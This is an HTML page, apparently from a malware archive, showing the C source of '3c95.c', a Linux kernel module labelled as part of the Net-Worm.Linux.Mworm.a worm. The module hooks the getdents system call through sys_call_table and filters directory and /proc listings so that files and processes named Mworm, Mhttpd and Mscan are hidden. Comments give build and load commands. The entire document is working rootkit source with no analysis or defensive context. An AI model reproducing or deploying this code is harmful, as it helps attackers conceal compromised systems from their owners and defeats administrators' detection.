<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Net-Worm.Linux.Mworm.a - 3c95.c.html</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc2 {
	color: #008000;
}
.sc4 {
	color: #FF8000;
}
.sc5 {
	font-weight: bold;
	color: #0000FF;
}
.sc7 {
	color: #808080;
}
.sc9 {
	color: #804000;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc11 {
}
.sc16 {
	color: #8000FF;
}
.sc19 {
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc2">//3c95.c
//hide the Mworm
//Based on Mscan
//Part of Mworm
//compile: gcc -O3 -DMODULE -D__KERNEL__ -c 3c95.c
//Usage: insmod 3c95.o
//   rmmmod 3c95.o
</span><span class="sc0">     
</span><span class="sc9">#include &lt;linux/config.h&gt;
#include &lt;linux/module.h&gt;
#include &lt;linux/version.h&gt;
#include &lt;linux/kernel.h&gt;
#include &lt;linux/malloc.h&gt;
#include &lt;linux/fs.h&gt;
#include &lt;linux/dirent.h&gt;
#include &lt;linux/proc_fs.h&gt;
#include &lt;linux/types.h&gt;
#include &lt;linux/stat.h&gt;
#include &lt;linux/fcntl.h&gt;
#include &lt;linux/mm.h&gt;
#include &lt;linux/if.h&gt;
#include &lt;sys/syscall.h&gt;
#include &lt;asm/types.h&gt;
#include &lt;asm/uaccess.h&gt;
#include &lt;asm/unistd.h&gt;
#include &lt;asm/segment.h&gt;
#include &lt;linux/types.h&gt;
#include &lt;linux/malloc.h&gt;
#include &lt;asm/unistd.h&gt;
#include &lt;asm/string.h&gt;
</span><span class="sc0">
</span><span class="sc9">#define HIDE_PS1    "Mworm" 
#define HIDE_PS2    "Mhttpd"
#define HIDE_FILE1  "Mscan"
</span><span class="sc0">
</span><span class="sc16">extern</span><span class="sc0"> </span><span class="sc16">void</span><span class="sc10">*</span><span class="sc0"> </span><span class="sc11">sys_call_table</span><span class="sc10">[];</span><span class="sc0">
</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc10">(*</span><span class="sc11">old_getdents</span><span class="sc10">)(</span><span class="sc11">uint</span><span class="sc10">,</span><span class="sc16">struct</span><span class="sc0"> </span><span class="sc11">dirent</span><span class="sc0"> </span><span class="sc10">*,</span><span class="sc11">uint</span><span class="sc10">);</span><span class="sc0">


</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">myatoi</span><span class="sc10">(</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">str</span><span class="sc10">){</span><span class="sc0">
 </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">res</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
 </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">mul</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">
 </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc19">ptr</span><span class="sc10">;</span><span class="sc0">
 </span><span class="sc5">for</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc19">ptr</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">str</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">strlen</span><span class="sc10">(</span><span class="sc11">str</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc19">ptr</span><span class="sc0"> </span><span class="sc10">&gt;=</span><span class="sc0"> </span><span class="sc11">str</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc19">ptr</span><span class="sc10">--)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
  </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(*</span><span class="sc19">ptr</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc7">'0'</span><span class="sc0"> </span><span class="sc10">||</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc19">ptr</span><span class="sc0"> </span><span class="sc10">&gt;</span><span class="sc0"> </span><span class="sc7">'9'</span><span class="sc10">)</span><span class="sc0">
   </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc10">(-</span><span class="sc4">1</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc11">res</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc10">(*</span><span class="sc19">ptr</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc0"> </span><span class="sc7">'0'</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc0"> </span><span class="sc11">mul</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc11">mul</span><span class="sc0"> </span><span class="sc10">*=</span><span class="sc0"> </span><span class="sc4">10</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">
 </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">res</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc16">struct</span><span class="sc0"> </span><span class="sc11">task_struct</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">get_task_structure</span><span class="sc10">(</span><span class="sc11">pid_t</span><span class="sc0"> </span><span class="sc11">n</span><span class="sc10">){</span><span class="sc0">
 </span><span class="sc16">struct</span><span class="sc0"> </span><span class="sc11">task_struct</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">tsp</span><span class="sc10">;</span><span class="sc0">
 </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">t</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc11">tsp</span><span class="sc10">=</span><span class="sc11">current</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc5">do</span><span class="sc10">{</span><span class="sc0">
                </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">tsp</span><span class="sc10">-&gt;</span><span class="sc11">pid</span><span class="sc10">==</span><span class="sc11">n</span><span class="sc10">)</span><span class="sc5">return</span><span class="sc0"> </span><span class="sc11">tsp</span><span class="sc10">;</span><span class="sc0">              
                 </span><span class="sc11">tsp</span><span class="sc10">=</span><span class="sc11">tsp</span><span class="sc10">-&gt;</span><span class="sc11">next_task</span><span class="sc10">;</span><span class="sc0">    
        </span><span class="sc10">}</span><span class="sc5">while</span><span class="sc10">(</span><span class="sc11">tsp</span><span class="sc10">!=</span><span class="sc11">current</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">new_getdents</span><span class="sc10">(</span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">fd</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">struct</span><span class="sc0"> </span><span class="sc11">dirent</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">dirp</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">count</span><span class="sc10">){</span><span class="sc0">
 </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">hmr</span><span class="sc10">,</span><span class="sc11">hme</span><span class="sc10">,</span><span class="sc11">original_ret</span><span class="sc10">,</span><span class="sc11">left</span><span class="sc10">;</span><span class="sc0">
 </span><span class="sc16">struct</span><span class="sc0"> </span><span class="sc11">dirent</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">d</span><span class="sc10">,*</span><span class="sc11">d2</span><span class="sc10">;</span><span class="sc0">
 </span><span class="sc16">struct</span><span class="sc0"> </span><span class="sc11">inode</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">dinode</span><span class="sc10">;</span><span class="sc0">
 </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">ps</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc11">tohide</span><span class="sc10">;</span><span class="sc0">
 </span><span class="sc16">struct</span><span class="sc0"> </span><span class="sc11">task_struct</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">tsp</span><span class="sc10">;</span><span class="sc0">

        </span><span class="sc5">if</span><span class="sc10">((</span><span class="sc11">original_ret</span><span class="sc10">=</span><span class="sc11">old_getdents</span><span class="sc10">(</span><span class="sc11">fd</span><span class="sc10">,</span><span class="sc11">dirp</span><span class="sc10">,</span><span class="sc11">count</span><span class="sc10">))==-</span><span class="sc4">1</span><span class="sc10">)</span><span class="sc5">return</span><span class="sc10">(</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc4">1</span><span class="sc0"> </span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc9">#ifdef __LINUX_DCACHE_H
</span><span class="sc0">                </span><span class="sc11">dinode</span><span class="sc10">=</span><span class="sc11">current</span><span class="sc10">-&gt;</span><span class="sc11">files</span><span class="sc10">-&gt;</span><span class="sc11">fd</span><span class="sc10">[</span><span class="sc11">fd</span><span class="sc10">]-&gt;</span><span class="sc11">f_dentry</span><span class="sc10">-&gt;</span><span class="sc11">d_inode</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc9">#else
</span><span class="sc0">                </span><span class="sc11">dinode</span><span class="sc10">=</span><span class="sc11">current</span><span class="sc10">-&gt;</span><span class="sc11">files</span><span class="sc10">-&gt;</span><span class="sc11">fd</span><span class="sc10">[</span><span class="sc11">fd</span><span class="sc10">]-&gt;</span><span class="sc11">f_inode</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc9">#endif
</span><span class="sc0">         </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">dinode</span><span class="sc10">-&gt;</span><span class="sc11">i_ino</span><span class="sc10">==</span><span class="sc11">PROC_ROOT_INO</span><span class="sc0"> </span><span class="sc10">&amp;&amp;</span><span class="sc0"> </span><span class="sc10">!</span><span class="sc11">MAJOR</span><span class="sc10">(</span><span class="sc11">dinode</span><span class="sc10">-&gt;</span><span class="sc11">i_dev</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">&amp;&amp;</span><span class="sc0"> </span><span class="sc11">MINOR</span><span class="sc10">(</span><span class="sc11">dinode</span><span class="sc10">-&gt;</span><span class="sc11">i_dev</span><span class="sc10">)==</span><span class="sc4">1</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc11">ps</span><span class="sc10">=</span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">

        
        </span><span class="sc11">d</span><span class="sc10">=(</span><span class="sc16">struct</span><span class="sc0"> </span><span class="sc11">dirent</span><span class="sc0"> </span><span class="sc10">*)</span><span class="sc11">kmalloc</span><span class="sc10">(</span><span class="sc11">original_ret</span><span class="sc10">,</span><span class="sc11">GFP_KERNEL</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc11">copy_from_user</span><span class="sc10">(</span><span class="sc11">d</span><span class="sc10">,</span><span class="sc11">dirp</span><span class="sc10">,</span><span class="sc11">original_ret</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc11">d2</span><span class="sc10">=</span><span class="sc11">d</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc11">left</span><span class="sc10">=</span><span class="sc11">original_ret</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc11">hme</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc5">while</span><span class="sc10">(</span><span class="sc11">left</span><span class="sc10">&gt;</span><span class="sc4">0</span><span class="sc10">){</span><span class="sc0">
                </span><span class="sc11">hmr</span><span class="sc10">=</span><span class="sc11">d2</span><span class="sc10">-&gt;</span><span class="sc11">d_reclen</span><span class="sc10">;</span><span class="sc0">
                </span><span class="sc11">left</span><span class="sc10">-=</span><span class="sc11">hmr</span><span class="sc10">;</span><span class="sc0">
                </span><span class="sc11">tohide</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
                </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">ps</span><span class="sc10">){</span><span class="sc0">
                        </span><span class="sc11">tsp</span><span class="sc10">=</span><span class="sc11">get_task_structure</span><span class="sc10">(</span><span class="sc11">myatoi</span><span class="sc10">(</span><span class="sc11">d2</span><span class="sc10">-&gt;</span><span class="sc11">d_name</span><span class="sc10">));</span><span class="sc0">
                        </span><span class="sc5">if</span><span class="sc10">((</span><span class="sc11">tsp</span><span class="sc10">!=</span><span class="sc5">NULL</span><span class="sc10">)&amp;&amp;(</span><span class="sc11">strstr</span><span class="sc10">(</span><span class="sc11">tsp</span><span class="sc10">-&gt;</span><span class="sc19">comm</span><span class="sc10">,</span><span class="sc11">HIDE_PS1</span><span class="sc10">)))</span><span class="sc0"> </span><span class="sc11">tohide</span><span class="sc10">=</span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">
                        </span><span class="sc5">if</span><span class="sc10">((</span><span class="sc11">tsp</span><span class="sc10">!=</span><span class="sc5">NULL</span><span class="sc10">)&amp;&amp;(</span><span class="sc11">strstr</span><span class="sc10">(</span><span class="sc11">tsp</span><span class="sc10">-&gt;</span><span class="sc19">comm</span><span class="sc10">,</span><span class="sc11">HIDE_PS2</span><span class="sc10">)))</span><span class="sc0"> </span><span class="sc11">tohide</span><span class="sc10">=</span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">
                </span><span class="sc10">}</span><span class="sc0">
                </span><span class="sc5">if</span><span class="sc10">((</span><span class="sc11">strstr</span><span class="sc10">((</span><span class="sc16">char</span><span class="sc10">*)</span><span class="sc11">d2</span><span class="sc10">-&gt;</span><span class="sc11">d_name</span><span class="sc10">,</span><span class="sc11">HIDE_PS1</span><span class="sc10">))||(</span><span class="sc11">strstr</span><span class="sc10">((</span><span class="sc16">char</span><span class="sc10">*)</span><span class="sc11">d2</span><span class="sc10">-&gt;</span><span class="sc11">d_name</span><span class="sc10">,</span><span class="sc11">HIDE_PS1</span><span class="sc10">))</span><span class="sc0">
                    </span><span class="sc10">||(</span><span class="sc11">strstr</span><span class="sc10">((</span><span class="sc16">char</span><span class="sc10">*)</span><span class="sc11">d2</span><span class="sc10">-&gt;</span><span class="sc11">d_name</span><span class="sc10">,</span><span class="sc11">HIDE_FILE1</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc10">||</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">tohide</span><span class="sc10">)){</span><span class="sc0">
                        </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">left</span><span class="sc10">&gt;</span><span class="sc4">0</span><span class="sc10">)</span><span class="sc11">memmove</span><span class="sc10">(</span><span class="sc11">d2</span><span class="sc10">,(</span><span class="sc16">char</span><span class="sc10">*)</span><span class="sc11">d2</span><span class="sc10">+</span><span class="sc11">hmr</span><span class="sc10">,</span><span class="sc11">left</span><span class="sc10">);</span><span class="sc0">       
                         </span><span class="sc5">else</span><span class="sc0"> </span><span class="sc11">d2</span><span class="sc10">-&gt;</span><span class="sc11">d_off</span><span class="sc10">=</span><span class="sc4">1024</span><span class="sc10">;</span><span class="sc0">
                        </span><span class="sc11">original_ret</span><span class="sc10">-=</span><span class="sc11">hmr</span><span class="sc10">;</span><span class="sc0">      
                </span><span class="sc10">}</span><span class="sc0">
                </span><span class="sc5">else</span><span class="sc0"> </span><span class="sc11">d2</span><span class="sc10">=(</span><span class="sc16">struct</span><span class="sc0"> </span><span class="sc11">dirent</span><span class="sc10">*)((</span><span class="sc16">char</span><span class="sc10">*)</span><span class="sc11">d2</span><span class="sc10">+</span><span class="sc11">hmr</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">       
        </span><span class="sc11">copy_to_user</span><span class="sc10">(</span><span class="sc11">dirp</span><span class="sc10">,</span><span class="sc11">d</span><span class="sc10">,</span><span class="sc11">original_ret</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc11">kfree</span><span class="sc10">(</span><span class="sc11">d</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc11">original_ret</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">init_module</span><span class="sc10">(</span><span class="sc16">void</span><span class="sc10">){</span><span class="sc0">
 </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">t</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc11">old_getdents</span><span class="sc10">=</span><span class="sc11">sys_call_table</span><span class="sc10">[</span><span class="sc11">SYS_getdents</span><span class="sc10">];</span><span class="sc0">
        </span><span class="sc11">sys_call_table</span><span class="sc10">[</span><span class="sc11">SYS_getdents</span><span class="sc10">]=</span><span class="sc11">new_getdents</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">

</span><span class="sc10">}</span><span class="sc0">
</span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">cleanup_module</span><span class="sc10">(</span><span class="sc16">void</span><span class="sc10">){</span><span class="sc0">
        </span><span class="sc11">sys_call_table</span><span class="sc10">[</span><span class="sc11">SYS_getdents</span><span class="sc10">]=</span><span class="sc11">old_getdents</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc5">return</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">}</span></div></body>
</html>
